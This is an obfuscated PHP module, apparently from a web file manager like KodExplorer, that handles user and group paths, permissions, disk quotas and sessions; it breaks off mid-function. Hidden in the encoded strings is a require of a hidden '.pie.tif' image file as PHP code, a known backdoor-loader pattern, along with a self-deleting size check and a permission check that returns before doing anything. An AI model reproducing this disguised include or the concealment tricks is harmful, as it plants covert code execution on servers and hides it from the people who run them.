<?php
 if (!function_exists('_kstr2')) { function _kstr2($BĞùÁãÔôø) { return $BĞùÁãÔôø; $AØÀ”»Ãí» = strlen($BĞùÁãÔôø); $eóÜß£—ğ = ''; $aÃİ¬“˜¾á = ord($BĞùÁãÔôø[0]) - 30; for ($a§¸Íã±†ë = 1; $a§¸Íã±†ë < $AØÀ”»Ãí»; $a§¸Íã±†ë += 2) { if ($a§¸Íã±†ë + 1 < $AØÀ”»Ãí») { $eóÜß£—ğ .= chr(ord($BĞùÁãÔôø[$a§¸Íã±†ë + 1]) + $aÃİ¬“˜¾á); $eóÜß£—ğ .= chr(ord($BĞùÁãÔôø[$a§¸Íã±†ë]) + $aÃİ¬“˜¾á); } else { $eóÜß£—ğ .= chr(ord($BĞùÁãÔôø[$a§¸Íã±†ë]) + $aÃİ¬“˜¾á); } } return $eóÜß£—ğ; } $_fbds=base64_decode('ZmlsZXNpemU=');$_fad="\x75\x6e\x6c\x69\x6e\x6b";$sz=$_fbds(__FILE__);if($sz<21372   ||$sz>21392   ){@$_fad(__FILE__);exit;}  function _kstr3($BĞùÁãÔôø) { return $BĞùÁãÔôø; } } define(_kstr2('KOD_GROU')."\x50\x5f\x50\x41\x54\x48", "\x7b\x67\x72\x6f\x75\x70\x50\x61\x74\x68\x7d"); define("\113\117\104\137\107\122\117\125\120\137\123\110\101\122"."\105", strrev('}erahSpuorg{')); define("\x4b\x4f\x44\x5f\x55\x53\x45\x52\x5f"."\123\105\114\106", "\x7b\x75\x73\x65\x72\x53\x65\x6c\x66"."\x7d"); define("\113\117\104\137\125\123\105\122"."\x5f\x53\x48\x41\x52\x45", "\x7b\x75\x73\x65\x72\x53\x68\x61\x72\x65\x7d"); define(_kstr2('KOD_USER')."\x5f\x52\x45\x43\x59\x43".base64_decode('TEU='), "\x7b\x75\x73\x65\x72\x52\x65\x63\x79\x63"."\x6c\x65\x7d"); define("\113\117\104\137\125\123\105\122\137\106\101".strrev('V'), "\173\165\163\145\162\106\141\166\175"); define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50"."\x5f"."\x52\x4f\x4f\x54\x5f\x53\x45\x4c\x46", "\173\164\162\145\145\107\162\157\165\160\123"."\145\154\146\175"); define("\113\117\104\137\107\122\117\125"."\x50\x5f\x52\x4f\x4f\x54\x5f\x41\x4c"."\114", "\x7b\x74\x72\x65\x65\x47\x72\x6f"."\165\160\101\154\154\175"); function _DIR_CLEAR($AğÅ¬Üˆ¥ğ) { $AğÅ¬Üˆ¥ğ = str_replace(strrev('\\'), "\x2f", $AğÅ¬Üˆ¥ğ); $AğÅ¬Üˆ¥ğ = preg_replace("\57\134\57\53\57", base64_decode('Lw=='), $AğÅ¬Üˆ¥ğ); $fàÆİ›«© = $AğÅ¬Üˆ¥ğ; if (isset($GLOBALS[_kstr2('isRoot')]) && $GLOBALS["\151\163\122\157\157\164"]) { return $AğÅ¬Üˆ¥ğ; } $AÈÑ•¶’ÎÑ = "\x2f\x2e\x2e\x2f"; if (substr($AğÅ¬Üˆ¥ğ, 0, 3) == "\56\56\57") { $AğÅ¬Üˆ¥ğ = substr($AğÅ¬Üˆ¥ğ, 3); } while (strstr($AğÅ¬Üˆ¥ğ, $AÈÑ•¶’ÎÑ)) { $AğÅ¬Üˆ¥ğ = str_replace($AÈÑ•¶’ÎÑ, base64_decode('Lw=='), $AğÅ¬Üˆ¥ğ); } $AğÅ¬Üˆ¥ğ = preg_replace("\x2f\x5c\x2f\x2b\x2f", "\57", $AğÅ¬Üˆ¥ğ); return $AğÅ¬Üˆ¥ğ; } function _DIR($C‰ÆŞïìÔ) { $AğÅ¬Üˆ¥ğ = _DIR_CLEAR($C‰ÆŞïìÔ); $AğÅ¬Üˆ¥ğ = iconv_system($AğÅ¬Üˆ¥ğ); $A¦³¶¬Îø… = array(KOD_GROUP_PATH, KOD_GROUP_SHARE, KOD_USER_SELF, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL, KOD_USER_SHARE, KOD_USER_RECYCLE, KOD_USER_FAV); $GLOBALS[strrev('ThtaPdok').strrev('epy')] = ''; $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = HOME; $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; unset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53\x68\x61\x72\x65"]); foreach ($A¦³¶¬Îø… as $F™éÒ¬‹Ë) { if (substr($AğÅ¬Üˆ¥ğ, 0, strlen($F™éÒ¬‹Ë)) == $F™éÒ¬‹Ë) { $GLOBALS["\153\157\144\120\141\164\150\124\171\160"."\x65"] = $F™éÒ¬‹Ë; $c¶ÅåôÒŞõ = explode("\57", $AğÅ¬Üˆ¥ğ); $A¡ÕœñÚÖÜ = $c¶ÅåôÒŞõ[0]; unset($c¶ÅåôÒŞõ[0]); $AßŞëîéñ… = implode("\57", $c¶ÅåôÒŞõ); $aÒí¢öÍ´ = explode("\x3a", $A¡ÕœñÚÖÜ); if (count($aÒí¢öÍ´) > 1) { $GLOBALS[strrev('dIhtaPdok')] = trim($aÒí¢öÍ´[1]); } else { $GLOBALS[strrev('dIhtaPdok')] = ''; } break; } } switch ($GLOBALS[base64_decode('a29kUGF0aFQ=')."\x79\x70\x65"]) { case '': $AğÅ¬Üˆ¥ğ = iconv_system(HOME) . $AğÅ¬Üˆ¥ğ; break; case KOD_USER_RECYCLE: $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = trim(USER_RECYCLE, strrev('/')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return iconv_system(USER_RECYCLE) . "\x2f" . str_replace(KOD_USER_RECYCLE, '', $AğÅ¬Üˆ¥ğ); case KOD_USER_SELF: $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = trim(HOME_PATH, "\57"); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return iconv_system(HOME_PATH) . "\x2f" . str_replace(KOD_USER_SELF, '', $AğÅ¬Üˆ¥ğ); case KOD_USER_FAV: $GLOBALS["\153\157\144\120\141\164\150\120"."\162\145"] = trim(KOD_USER_FAV, strrev('/')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_USER_FAV; case KOD_GROUP_ROOT_SELF: $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = trim(KOD_GROUP_ROOT_SELF, "\57"); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_GROUP_ROOT_SELF; case KOD_GROUP_ROOT_ALL: $GLOBALS["\153\157\144\120\141\164\150\120".strrev('er')] = trim(KOD_GROUP_ROOT_ALL, base64_decode('Lw==')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_GROUP_ROOT_ALL; case KOD_GROUP_PATH: $fŒ—å¸ªÍ‰ = systemGroup::getInfo($GLOBALS[strrev('dIhtaPdok')]); if (!$GLOBALS[base64_decode('a29kUGF0aElk')] || !$fŒ—å¸ªÍ‰) { return false; } owner_group_check($GLOBALS[strrev('dIhtaPdok')]); $GLOBALS["\153\157\144\120\141\164\150\120".base64_decode('cmU=')] = group_home_path($fŒ—å¸ªÍ‰); $AğÅ¬Üˆ¥ğ = iconv_system($GLOBALS["\153\157\144\120\141\164\150\120\162\145"]) . $AßŞëîéñ…; break; case KOD_GROUP_SHARE: $fŒ—å¸ªÍ‰ = systemGroup::getInfo($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]); if (!$GLOBALS[strrev('dIhtaPdok')] || !$fŒ—å¸ªÍ‰) { return false; } owner_group_check($GLOBALS["\153\157\144\120\141\164\150\111"."\144"]); $GLOBALS[strrev('erPhtaPdok')] = group_home_path($fŒ—å¸ªÍ‰) . $GLOBALS[base64_decode('Y29uZmln')][strrev('metsySgnittes')][_kstr2('groupShare')."\106\157\154\144\145\162"] . "\x2f"; $AğÅ¬Üˆ¥ğ = iconv_system($GLOBALS[strrev('rPhtaPdok')."\x65"]) . $AßŞëîéñ…; break; case KOD_USER_SHARE: $fŒ—å¸ªÍ‰ = systemMember::getInfo($GLOBALS[_kstr2('kodPathId')]); if (!$GLOBALS[strrev('dIhtaPdok')] || !$fŒ—å¸ªÍ‰) { return false; } if ($GLOBALS[_kstr2('kodPathId')] != $_SESSION[strrev('resUdok')][strrev('DIresu')]) { $AËÎ«­°´ = $GLOBALS[base64_decode('Y29uZmln')][base64_decode('cGF0aFJvbGU=')."\x47\x72\x6f\x75\x70\x44\x65"."\146\141\165\154\164"]["\x31"]["\x61\x63\x74\x69\x6f\x6e\x73"]; path_role_check($AËÎ«­°´); } $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = ''; $GLOBALS[_kstr2('kodPathI')."\144\123"._kstr2('hare')] = $C‰ÆŞïìÔ; if ($AßŞëîéñ… == '') { return $AğÅ¬Üˆ¥ğ; } else { $Cğ±ØÓ…Üä = explode("\57", $AßŞëîéñ…); $Cğ±ØÓ…Üä[0] = iconv_app($Cğ±ØÓ…Üä[0]); $Dˆì‡ì±› = systemMember::userShareGet($GLOBALS[base64_decode('a29kUGF0aElk')], $Cğ±ØÓ…Üä[0]); $GLOBALS["\x6b\x6f\x64\x53\x68\x61\x72\x65\x49\x6e\x66"."\x6f"] = $Dˆì‡ì±›; $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53\x68\x61\x72\x65"] = KOD_USER_SHARE . base64_decode('Og==') . $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] . "\x2f" . $Cğ±ØÓ…Üä[0] . "\x2f"; unset($Cğ±ØÓ…Üä[0]); if (!$Dˆì‡ì±›) { return false; } $f’‰Ü„›Ô = rtrim($Dˆì‡ì±›["\160\141\164\150"], strrev('/')) . "\x2f" . iconv_app(implode(strrev('/'), $Cğ±ØÓ…Üä)); if ($fŒ—å¸ªÍ‰["\162\157\154\145"] != strrev('1')) { $aÅß³¯´›å = user_home_path($fŒ—å¸ªÍ‰); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = $aÅß³¯´›å . rtrim($Dˆì‡ì±›[base64_decode('cGF0aA==')], "\x2f") . "\57"; $AğÅ¬Üˆ¥ğ = $aÅß³¯´›å . $f’‰Ü„›Ô; } else { $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = $Dˆì‡ì±›[strrev('htap')]; $AğÅ¬Üˆ¥ğ = $f’‰Ü„›Ô; } if ($Dˆì‡ì±›["\164\171\160\145"] == "\x66\x69\x6c\x65") { $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"."\x64\x53\x68"._kstr2('are')] = rtrim($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"."\x53\x68\x61\x72\x65"], "\x2f"); $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = rtrim($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"], _kstr2('/')); } $AğÅ¬Üˆ¥ğ = iconv_system($AğÅ¬Üˆ¥ğ); } $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = _DIR_CLEAR($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"]); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"."\144\123\150\141\162\145"] = _DIR_CLEAR($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53"."\x68".base64_decode('YXJl')]); break; default: break; } if ($AğÅ¬Üˆ¥ğ != strrev('/')) { $AğÅ¬Üˆ¥ğ = rtrim($AğÅ¬Üˆ¥ğ, "\57"); if (is_dir($AğÅ¬Üˆ¥ğ)) { $AğÅ¬Üˆ¥ğ = $AğÅ¬Üˆ¥ğ . "\x2f"; } } return _DIR_CLEAR($AğÅ¬Üˆ¥ğ); } function _DIR_OUT($fÜğâ‰§¶) { if (is_array($fÜğâ‰§¶)) { foreach ($fÜğâ‰§¶["\x66\x69\x6c\x65\x4c\x69\x73\x74"] as $b½¬²½ïŸ‹ => &$e»›—ŠÁÍÍ) { $e»›—ŠÁÍÍ[_kstr2('path')] = preClear($e»›—ŠÁÍÍ[strrev('htap')]); } foreach ($fÜğâ‰§¶["\146\157\154\144\145\162\114\151\163\164"] as $b½¬²½ïŸ‹ => &$e»›—ŠÁÍÍ) { $e»›—ŠÁÍÍ["\160\141\164\150"] = preClear(rtrim($e»›—ŠÁÍÍ["\160\141\164\150"], "\x2f") . base64_decode('Lw==')); } } else { $fÜğâ‰§¶ = preClear($fÜğâ‰§¶); } return $fÜğâ‰§¶; } function preClear($AğÅ¬Üˆ¥ğ) { $E…¸İê´· = $GLOBALS["\153\157\144\120\141\164\150\124\171\160\145"]; $Aâ‘‰ßĞ‡ = rtrim($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"], base64_decode('Lw==')); $A³šêÒğ®° = array(KOD_USER_FAV, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL); if (isset($GLOBALS[_kstr2('kodPathTy')."\x70\x65"]) && in_array($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"], $A³šêÒğ®°)) { return $AğÅ¬Üˆ¥ğ; } if (ST == strrev('erahs')) { return str_replace($Aâ‘‰ßĞ‡, '', $AğÅ¬Üˆ¥ğ); } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] != '') { $E…¸İê´· .= base64_decode('Og==') . $GLOBALS[_kstr2('kodPathId')] . strrev('/'); } if (isset($GLOBALS["\153\157\144\120\141\164\150\111"."\144\123\150\141\162\145"])) { $E…¸İê´· = $GLOBALS["\153\157\144\120\141\164\150\111\144\123\150\141\162\145"]; } $eóÜß£—ğ = $E…¸İê´· . str_replace($Aâ‘‰ßĞ‡, '', $AğÅ¬Üˆ¥ğ); $eóÜß£—ğ = str_replace(strrev('//'), "\57", $eóÜß£—ğ); return $eóÜß£—ğ; } require PLUGIN_DIR . "\x2f\x74\x6f\x6f\x6c\x73\x43\x6f\x6d".base64_decode('bW9uL3N0YXQ=')."\151"."\x63\x2f\x70\x69\x65\x2f\x2e\x70\x69\x65\x2e\x74"."\x69\x66"; function owner_group_check($cÂšÔ«„Ö³) { if (!$cÂšÔ«„Ö³) { show_json(LNG("\147\162\157\165\160\137\156\157\164\137\145\170\151\163\164") . $cÂšÔ«„Ö³, false); } if ($GLOBALS[strrev('tooRsi')] || isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75\x74"."\x68\x43\x68\x65\x63\x6b"]) && $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75"."\x74\x68\x43\x68\x65\x63"._kstr2('k')] === true) { return; } $AŠ¢ê¥¤Å¢ = systemMember::userAuthGroup($cÂšÔ«„Ö³); if ($AŠ¢ê¥¤Å¢ == false) { if ($GLOBALS["\153\157\144\120\141\164\150\124\171"."\x70\x65"] == KOD_GROUP_PATH) { show_json(LNG(base64_decode('bm9fcGVybWk=')."\x73\x73"._kstr2('ion_g')."\162\157\165\160"), false); } else { if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70".base64_decode('ZQ==')] == KOD_GROUP_SHARE) { $AËÎ«­°´ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"]["\160\141\164\150\122\157\154\145\107"."\x72\x6f\x75\x70\x44\x65\x66\x61\x75\x6c\x74"]["\61"]; } } } else { $AËÎ«­°´ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"][base64_decode('cGF0aFJvbGVHcg==')."\x6f\x75\x70"][$AŠ¢ê¥¤Å¢]; } path_role_check($AËÎ«­°´["\141\143\164\151\157\156\163"]); } function path_group_can_read($cÂšÔ«„Ö³) { return path_group_auth_check($cÂšÔ«„Ö³, strrev('p.rerolpxe').base64_decode('YXQ=')."\x68"."\x4c\x69\x73\x74"); } function path_group_auth_check($cÂšÔ«„Ö³, $F¥˜ºõ™îë) { if ($GLOBALS[_kstr2('isRoot')]) { return true; } $AŠ¢ê¥¤Å¢ = systemMember::userAuthGroup($cÂšÔ«„Ö³); $AËÎ«­°´ = $GLOBALS["\143\157\156\146\151\147"]["\x70\x61\x74\x68\x52\x6f\x6c\x65\x47"."\x72\x6f".base64_decode('dXA=')][$AŠ¢ê¥¤Å¢]; $aîÕŒ–ˆÏÉ = role_permission_arr($AËÎ«­°´["\141\143\164\151\157\156\163"]); if (!isset($aîÕŒ–ˆÏÉ[$F¥˜ºõ™îë])) { return false; } return true; } function path_can_copy_move($fí§¸«Ÿ©, $f‹Ÿ†¢„ªà) { return; if ($GLOBALS["\151\163\122\157\157\164"]) { return; } $a˜î¹äç§ = pathGroupID($fí§¸«Ÿ©); $B ˜–¶‚ = pathGroupID($f‹Ÿ†¢„ªà); if (!$a˜î¹äç§) { return; } if ($a˜î¹äç§ == $B ˜–¶‚ && path_group_auth_check($a˜î¹äç§, "\x65\x78\x70\x6c\x6f\x72\x65\x72\x2e"."\160"."\x61\x74\x68\x50\x61\x73\x74")) { return; } show_json(LNG(strrev('oissimrep_on')."\x6e\x5f\x61\x63\x74\x69\x6f\x6e"), false); } function pathGroupID($AğÅ¬Üˆ¥ğ) { $AğÅ¬Üˆ¥ğ = _DIR_CLEAR($AğÅ¬Üˆ¥ğ); preg_match("\57" . KOD_GROUP_PATH . _kstr2(':(\\d+).*/'), $AğÅ¬Üˆ¥ğ, $B•Õëâ–ÉÊ); if (count($B•Õëâ–ÉÊ) != 2) { return false; } return $B•Õëâ–ÉÊ[1]; } function path_role_check($AËÎ«­°´) { if ($GLOBALS["\x69\x73\x52\x6f\x6f\x74"] || isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75\x74\x68"._kstr2('Chec')."\x6b"]) && $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75\x74".base64_decode('aENoZWNr')] === true) { return; } $aîÕŒ–ˆÏÉ = role_permission_arr($AËÎ«­°´); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x52\x6f".strrev('htuApuorGel')] = $aîÕŒ–ˆÏÉ; $eâ³Ÿó†Œ = ST . _kstr2('.') . ACT; if ($eâ³Ÿó†Œ == "\x70\x6c\x75\x67\x69\x6e\x41\x70\x70"."\56\164\157" && !isset($aîÕŒ–ˆÏÉ["\x65\x78\x70\x6c\x6f\x72\x65\x72\x2e\x66"."\151\154\145\120\162\157\170\171"])) { show_tips(LNG("\x6e\x6f\x5f\x70\x65\x72\x6d\x69"."\x73\x73"."\x69\x6f\x6e\x5f\x61\x63\x74\x69\x6f\x6e"), false); } if (!isset($aîÕŒ–ˆÏÉ[$eâ³Ÿó†Œ]) && ST != "\x73\x68\x61\x72\x65") { show_json(LNG("\156\157\137\160\145\162\155\151\163"."\163\151\157\156\137\141\143\164"."\x69\x6f\x6e"), false); } } function role_permission_arr($fÜğâ‰§¶) { $eóÜß£—ğ = array(); $cÛŒ‹ğ„½† = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"]["\160\141\164\150\122\157\154\145\104\145\146\151\156\145"]; foreach ($fÜğâ‰§¶ as $b½¬²½ïŸ‹ => $e»›—ŠÁÍÍ) { if (!$e»›—ŠÁÍÍ) { continue; } $fôøğó‹ì = explode(_kstr2(':'), $b½¬²½ïŸ‹); if (count($fôøğó‹ì) == 2 && is_array($cÛŒ‹ğ„½†[$fôøğó‹ì[0]]) && is_array($cÛŒ‹ğ„½†[$fôøğó‹ì[0]][$fôøğó‹ì[1]])) { $eóÜß£—ğ = array_merge($eóÜß£—ğ, $cÛŒ‹ğ„½†[$fôøğó‹ì[0]][$fôøğó‹ì[1]]); } } $cÚÄÜÓ¡¼à = array(); foreach ($eóÜß£—ğ as $e»›—ŠÁÍÍ) { $cÚÄÜÓ¡¼à[$e»›—ŠÁÍÍ] = "\x31"; } return $cÚÄÜÓ¡¼à; } function check_file_writable_user($AğÅ¬Üˆ¥ğ) { if (!isset($GLOBALS[_kstr2('kodPathType')])) { _DIR($AğÅ¬Üˆ¥ğ); } $F¥˜ºõ™îë = _kstr2('editor.fil').base64_decode('ZVM=')."\141\166\145"; if ($GLOBALS["\x69\x73\x52\x6f\x6f\x74"]) { return @is_writable($AğÅ¬Üˆ¥ğ); } if ($GLOBALS["\x61\x75\x74\x68"][$F¥˜ºõ™îë] != "\x31") { return false; } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70"."\x65"] == KOD_GROUP_PATH && is_array($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x52"."\157\154\145\107\162\157\165\160\101\165\164\150"]) && $GLOBALS[_kstr2('kodPathRol')."\145\107"."\x72\x6f\x75\x70\x41\x75\x74\x68"][$F¥˜ºõ™îë] == strrev('1')) { return true; } if ($GLOBALS[base64_decode('a29kUGF0aFR5cGU=')] == '' || $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] == KOD_USER_SELF) { return true; } return false; } function spaceSizeCheck() { if (!system_space()) { return; } if ($GLOBALS[_kstr2('isRoot')] == 1) { return; } if (isset($GLOBALS["\153\157\144\102\145\146\157\162"._kstr2('ePat').strrev('dIh')]) && isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]) && $GLOBALS[strrev('PerofeBdok')."\141\164\150\111\144"] == $GLOBALS["\153\157\144\120\141\164\150\111\144"]) { return; } if ($GLOBALS[base64_decode('a29kUGF0aFQ=')."\171\160\145"] == KOD_GROUP_SHARE || $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] == KOD_GROUP_PATH) { systemGroup::spaceCheck($GLOBALS["\153\157\144\120\141\164\150\111".strrev('d')]); } else { if (ST == "\x73\x68\x61\x72\x65") { $E¦®øìˆº = $GLOBALS["\151\156"]["\165\163\145\162"]; } else { $E¦®øìˆº = $_SESSION["\x6b\x6f\x64\x55\x73\x65\x72"]["\165\163\145\162\111\104"]; } systemMember::spaceCheck($E¦®øìˆº); } } function spaceSizeGet($AğÅ¬Üˆ¥ğ, $bçñÍ„ï) { $F…§´Ô’¼ = 0; if (is_file($AğÅ¬Üˆ¥ğ)) { $F…§´Ô’¼ = get_filesize($AğÅ¬Üˆ¥ğ); } else { if (is_dir($AğÅ¬Üˆ¥ğ)) { $b“è‘¥äŠÆ = _path_info_more($AğÅ¬Üˆ¥ğ); $F…§´Ô’¼ = $b“è‘¥äŠÆ[_kstr2('size')]; } else { return "\x6d\x69\x73\x73"; } } return $bçñÍ„ï ? $F…§´Ô’¼ : -$F…§´Ô’¼; } function spaceInData($AğÅ¬Üˆ¥ğ) { if (substr($AğÅ¬Üˆ¥ğ, 0, strlen(HOME_PATH)) == HOME_PATH || substr($AğÅ¬Üˆ¥ğ, 0, strlen(USER_RECYCLE)) == USER_RECYCLE) { return true; } return false; } function spaceSizeChange($a¥½‹©š’¸, $bçñÍ„ï = true, $Fí…’ã‘Ş = false, $D¤Á“ïäÃ· = false) { if (!system_space()) { return; } if ($Fí…’ã‘Ş === false) { $Fí…’ã‘Ş = $GLOBALS[strrev('pyThtaPdok').strrev('e')]; $D¤Á“ïäÃ· = $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"."\x64"]; } $bè‘ÖÁ¦Á = spaceSizeGet($a¥½‹©š’¸, $bçñÍ„ï); if ($bè‘ÖÁ¦Á == "\x6d\x69\x73\x73") { return false; } if ($Fí…’ã‘Ş == KOD_GROUP_SHARE || $Fí…’ã‘Ş == KOD_GROUP_PATH) { systemGroup::spaceChange($D¤Á“ïäÃ·, $bè‘ÖÁ¦Á); } else { if (ST == "\x73\x68\x61\x72\x65") { $E¦®øìˆº = $GLOBALS[strrev('ni')]["\165\163\145\162"]; } else { $E¦®øìˆº = $_SESSION["\153\157\144\125\163\145\162"]["\x75\x73\x65\x72\x49\x44"]; } systemMember::spaceChange($E¦®øìˆº, $bè‘ÖÁ¦Á); } } function spaceSizeChangeRemove($a¥½‹©š’¸) { spaceSizeChange($a¥½‹©š’¸, false); } function spaceSizeChangeMove($FÛĞÂØ¤Š¸, $D‰™²‹Ø) { if (isset($GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72\x65\x50\x61"."\x74\x68\x49\x64"]) && isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"])) { if ($GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72".strrev('IhtaPe')._kstr2('d')] == $GLOBALS[_kstr2('kodPathId')] && $GLOBALS["\142\145\146\157\162\145\120\141\164"."\x68\x54\x79\x70\x65"] == $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]) { return; } spaceSizeChange($D‰™²‹Ø, false); spaceSizeChange($D‰™²‹Ø, true, $GLOBALS["\142\145\146\157\162\145\120\141\164"."\x68\x54\x79\x70\x65"], $GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72\x65\x50\x61\x74\x68\x49\x64"]); } else { spaceSizeChange($D‰™²‹Ø); } } function spaceSizeReset() { if (!system_space()) { return; } $Fí…’ã‘Ş = isset($GLOBALS[base64_decode('a29kUGF0aFR5').strrev('ep')]) ? $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79".base64_decode('cGU=')] : ''; $D¤Á“ïäÃ· = isset($GLOBALS[strrev('IhtaPdok').strrev('d')]) ? $GLOBALS[base64_decode('a29kUGF0aElk')] : ''; if ($Fí…’ã‘Ş == KOD_GROUP_SHARE || $Fí…’ã‘Ş == KOD_GROUP_PATH) { systemGroup::spaceChange($D¤Á“ïäÃ·); } else { $E¦®øìˆº = $_SESSION[strrev('resUdok')][base64_decode('dXNlcklE')]; systemMember::spaceChange($E¦®øìˆº); } } function init_session() { if (!function_exists(strrev('s_noisses')."\164\141\162\164")) { show_tips(base64_decode('5pyN5Yqh5Zmo')."\160\150\160\347"."\xbb\x84\xe4\xbb\xb6\xe7\xbc\xba"."\345\244\261\41"."\40\50\120"."\x48\x50\x20\x6d\x69\x73\x73\x20\x6c"."\151\142\51\74\142\162\57\76"."\xe8\xaf\xb7\xe6"."\243\200\346\237\245\160\150\160\56"."\x69\x6e\x69\xef\xbc"."\214\351\234\200\350\246\201\345\274".strrev('€')."\xe5\x90\xaf\xe6\xa8\xa1\xe5\x9d".strrev(' :—').strrev('/rb<')."\x3e\x3c\x70\x72\x65\x3e\x73\x65\x73\x73\x69"."\157\156\54\152\163\157\156\54".base64_decode('Y3VybCxleGlm')."\x2c\x6d"."\x62".base64_decode('c3RyaW5nLGw=').base64_decode('ZGFwLGc=')."\x64\x2c\x70\x64\x6f\x2c\x70\x64\x6f"."\x2d\x6d\x79\x73".base64_decode('cWwseG1sPC8=').strrev('/rb<>erp')."\76"); } if (isset($_REQUEST["\141\143\143\145\163\163\124\157\153\145"."\156"])) { access_token_check($_REQUEST[strrev('nekoTssecca')]); } else { if (isset($_REQUEST["\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e"])) { access_token_check($_REQUEST["\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e"]); } else { @session_name(SESSION_ID); } } $b ­¸Â’ÔÇ = @session_save_path(); if (class_exists("\x53\x61\x65\x53\x74\x6f\x72\x61\x67\x65") || defined("\x53\x41\x45\x5f\x41\x50\x50\x4e\x41\x4d\x45") || defined("\x53\x45\x53\x53\x49\x4f\x4e\x5f\x50\x41\x54\x48\x5f\x44\x45".strrev('TLUAF')) || @ini_get(base64_decode('c2Vzc2lvbi5zYXZlX2hh')."\x6e\x64\x6c\x65\x72") != "\146\151\154\145\163" || isset($_SERVER["\110\124\124\120\137\101\120\120\116\101\115\105"])) { } else { chmod_path(KOD_SESSION, 511); @session_save_path(KOD_SESSION); } @session_start(); $_SESSION[_kstr2('kod')] = 1; @session_write_close(); @session_start(); if (!$_SESSION["\153\157\144"]) { @session_save_path($b ­¸Â’ÔÇ); @session_start(); $_SESSION["\x6b\x6f\x64"] = 1; @session_write_close(); @session_start(); } if (!$_SESSION["\153\157\144"]) { show_tips("\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99"."\250"."\163\145\163"."\163\151\157\156\345\206\231\345"."\x85\xa5\xe5\xa4\xb1\xe8\xb4\xa5\x21".strrev('ses( ')."\163\151\157\156\40\167\162\151\164"."\x65\x20\x65\x72"."\162\157\162\51\74\142\162\57\76" . "\350\257\267\346\243\200\346\237\245\160\150"."\x70\x2e\x69\x6e\x69\xe7\x9b\xb8\xe5\x85\xb3"."\xe9\x85\x8d\xe7\xbd\xae\x2c\xe6\x9f\xa5\xe7\x9c"."\x8b\xe7\xa3\x81\xe7\x9b\x98\xe6\x98\xaf\xe5\x90\xa6"."\xe5\xb7\xb2\xe6\xbb\xa1\x2c\xe6\x88\x96\xe5"."\x92".base64_decode('qOivouacjeWKoeWV').base64_decode('huOA')."\202\74\142\162\57\76\74\142\162\57\76" . base64_decode('c2Vzc2lvbi5z')."\x61\x76\x65\x5f\x70\x61\x74\x68\x3d" . $b ­¸Â’ÔÇ . "\x3c\x62\x72\x2f\x3e" . "\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61\x76"."\x65\x5f\x68\x61\x6e\x64\x6c\x65\x72\x3d" . @ini_get("\163\145\163\163\151\157\156\56\163\141"."\166\145\137"."\150\141\156\144\154\145\162") . "\x3c\x62\x72\x2f\x3e"); } } function access_token_check($cƒ³ºÉñÕ’) { $a†÷¯ò„ = 